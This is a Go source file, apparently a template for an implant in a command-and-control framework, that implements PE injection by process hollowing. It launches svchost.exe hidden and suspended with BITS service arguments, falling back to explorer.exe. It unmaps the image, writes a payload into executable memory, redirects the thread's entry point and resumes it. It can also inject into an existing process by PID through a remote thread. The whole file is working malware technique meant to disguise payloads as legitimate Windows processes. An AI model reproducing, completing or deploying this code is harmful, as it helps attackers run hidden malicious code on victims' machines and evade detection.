import (
	"encoding/base64"
	"fmt"
	"strings"
	"syscall"
	"unsafe"
)

// PE injection functionality with PID parameter
func (a *{AGENT_STRUCT_NAME}) {AGENT_INJECT_PE_FUNC}_with_pid(peData []byte, pid uint32) string {
	if len(peData) < 1024 { // Minimum size check
		return "[ERROR] PE file too small to be valid"
	}

	// Parse the PE file to extract necessary information
	dosHeader := (*IMAGE_DOS_HEADER)(unsafe.Pointer(&peData[0]))
	if dosHeader.E_magic != IMAGE_DOS_SIGNATURE {
		return "[ERROR] Invalid DOS signature"
	}

	ntHeadersOffset := dosHeader.E_lfanew
	if int(ntHeadersOffset) >= len(peData) || ntHeadersOffset < 0 {
		return "[ERROR] Invalid NT headers offset"
	}

	// Add bounds checking for NT signature
	if int(ntHeadersOffset) + 4 > len(peData) {
		return "[ERROR] NT headers offset beyond data bounds"
	}

	ntSignature := *(*uint32)(unsafe.Pointer(&peData[ntHeadersOffset]))
	if ntSignature != IMAGE_NT_SIGNATURE {
		return "[ERROR] Invalid NT signature"
	}

	// Parse NT headers based on architecture
	if int(ntHeadersOffset) + 4 + int(unsafe.Sizeof(IMAGE_FILE_HEADER{})) >= len(peData) {
		return "[ERROR] PE data too small for NT headers"
	}

	fileHeader := (*IMAGE_FILE_HEADER)(unsafe.Pointer(&peData[ntHeadersOffset+4]))

	var imageBase uintptr
	var entryPoint uint32
	var imageSize uint32

	if fileHeader.Machine == IMAGE_FILE_MACHINE_AMD64 {
		headerOffset := ntHeadersOffset + int32(4) + int32(unsafe.Sizeof(IMAGE_FILE_HEADER{}))
		if int(headerOffset) + int(unsafe.Sizeof(IMAGE_OPTIONAL_HEADER64{})) >= len(peData) {
			return "[ERROR] PE data too small for x64 optional header"
		}
		optionalHeader := (*IMAGE_OPTIONAL_HEADER64)(unsafe.Pointer(&peData[headerOffset]))
		imageBase = uintptr(optionalHeader.ImageBase)
		entryPoint = optionalHeader.AddressOfEntryPoint
		imageSize = optionalHeader.SizeOfImage
	} else if fileHeader.Machine == IMAGE_FILE_MACHINE_I386 {
		headerOffset := ntHeadersOffset + int32(4) + int32(unsafe.Sizeof(IMAGE_FILE_HEADER{}))
		if int(headerOffset) + int(unsafe.Sizeof(IMAGE_OPTIONAL_HEADER32{})) >= len(peData) {
			return "[ERROR] PE data too small for x86 optional header"
		}
		optionalHeader := (*IMAGE_OPTIONAL_HEADER32)(unsafe.Pointer(&peData[headerOffset]))
		imageBase = uintptr(optionalHeader.ImageBase)
		entryPoint = optionalHeader.AddressOfEntryPoint
		imageSize = optionalHeader.SizeOfImage
	} else {
		return "[ERROR] Unsupported architecture"
	}

	var pi PROCESS_INFORMATION

	if pid == 0 {
		// No PID provided, create a new target process (original behavior)
		// Create target process in suspended state
		targetPath, _ := syscall.UTF16PtrFromString("C:\\Windows\\System32\\svchost.exe")
		var si STARTUPINFO
		si.Cb = uint32(unsafe.Sizeof(si))
		si.Flags = 0x1        // STARTF_USESHOWWINDOW
		si.ShowWindow = 0     // SW_HIDE (hidden)

		// Command line needed for svchost.exe to work properly
		cmdLine, _ := syscall.UTF16PtrFromString("svchost.exe -k netsvcs -s BITS")

		err := createProcess(
			targetPath, // Path to target process
			cmdLine,    // Command line (needed for svchost.exe)
			nil,        // Process attributes
			nil,        // Thread attributes
			false,      // Inherit handles
			0x4,        // CREATE_SUSPENDED flag
			0,          // Environment
			nil,        // Current directory
			&si,        // Startup info
			&pi,        // Process information
		)

		// If svchost.exe fails, fallback to explorer.exe
		if err != nil {
			targetPath, _ = syscall.UTF16PtrFromString("C:\\Windows\\explorer.exe")
			cmdLine, _ = syscall.UTF16PtrFromString("explorer.exe")
			err = createProcess(
				targetPath,
				cmdLine,
				nil,
				nil,
				false,
				0x4,
				0,
				nil,
				&si,
				&pi,
			)

			if err != nil {
				return fmt.Sprintf("[ERROR] Failed to create suspended target process (svchost.exe or explorer.exe): %v", err)
			}
		}
	} else {
		// PID provided, open the existing process
		pi.Process = openProcess(PROCESS_ALL_ACCESS, 0, pid)
		if pi.Process == 0 {
			return fmt.Sprintf("[ERROR] Failed to open target process with PID: %d", pid)
		}
		// For existing process injection, we don't have thread info yet,
		// so we'll get it after injection
	}

	// Unmap the target process memory (only for newly created processes)
	if pid == 0 {
		result := ntUnmapViewOfSection(pi.Process, uintptr(imageBase))
		if result != 0 {
			// Continue execution anyway as this might not be critical
		}
	}

	// Allocate memory in the target process for the PE file
	allocAddr := virtualAllocEx(pi.Process, imageBase, uintptr(imageSize), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if allocAddr == 0 {
		// Try without specifying base address
		allocAddr = virtualAllocEx(pi.Process, 0, uintptr(imageSize), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
		if allocAddr == 0 {
			if pid != 0 {
				closeHandle(pi.Process) // Clean up handle for existing process
			}
			return "[ERROR] Failed to allocate memory in target process"
		}
	}

	// Write the PE headers to the allocated memory
	var bytesWritten uintptr
	success := writeProcessMemory(pi.Process, allocAddr, uintptr(unsafe.Pointer(&peData[0])), uintptr(len(peData)), &bytesWritten)
	if !success {
		if pid != 0 {
			closeHandle(pi.Process) // Clean up handle for existing process
		}
		return "[ERROR] Failed to write PE headers to target process memory"
	}

	if pid == 0 {
		// For newly created process, get thread context and update entry point
		// Get the current thread context
		var context CONTEXT
		context.ContextFlags = 0x00000001 | 0x00000002 | 0x00000010 // CONTEXT_CONTROL | CONTEXT_INTEGER
		err := getThreadContext(pi.Thread, &context)
		if err != nil {
			closeHandle(pi.Process)
			closeHandle(pi.Thread)
			return fmt.Sprintf("[ERROR] Failed to get thread context: %v", err)
		}

		// Update the entry point in the context
		newEntryPoint := allocAddr + uintptr(entryPoint)
		context.Rip = uint64(newEntryPoint) // For x64, update the instruction pointer

		// Set the updated context
		err = setThreadContext(pi.Thread, &context)
		if err != nil {
			closeHandle(pi.Process)
			closeHandle(pi.Thread)
			return fmt.Sprintf("[ERROR] Failed to set thread context: %v", err)
		}

		// Resume the target process thread
		_, err = resumeThread(pi.Thread)
		if err != nil {
			closeHandle(pi.Process)
			closeHandle(pi.Thread)
			return fmt.Sprintf("[ERROR] Failed to resume target process thread: %v", err)
		}

		closeHandle(pi.Process)
		closeHandle(pi.Thread)

		return fmt.Sprintf("[SUCCESS] PE file injected and executed in process PID: %d, TID: %d", pi.ProcessId, pi.ThreadId)
	} else {
		// For existing process, we need to create a remote thread to execute the PE
		var threadID uint32
		threadHandle := createRemoteThread(pi.Process, 0, 0, allocAddr, 0, 0, &threadID)
		if threadHandle != 0 {
			closeHandle(threadHandle)
			closeHandle(pi.Process) // Clean up process handle
			return fmt.Sprintf("[SUCCESS] PE file injected into existing process PID: %d, thread ID: %d", pid, threadID)
		} else {
			closeHandle(pi.Process) // Clean up process handle
			return fmt.Sprintf("[ERROR] Failed to create remote thread in process PID: %d", pid)
		}
	}
}

// Original PE injection functionality (for backward compatibility)
func (a *{AGENT_STRUCT_NAME}) {AGENT_INJECT_PE_FUNC}(peData []byte) string {
	return a.{AGENT_INJECT_PE_FUNC}_with_pid(peData, 0)
}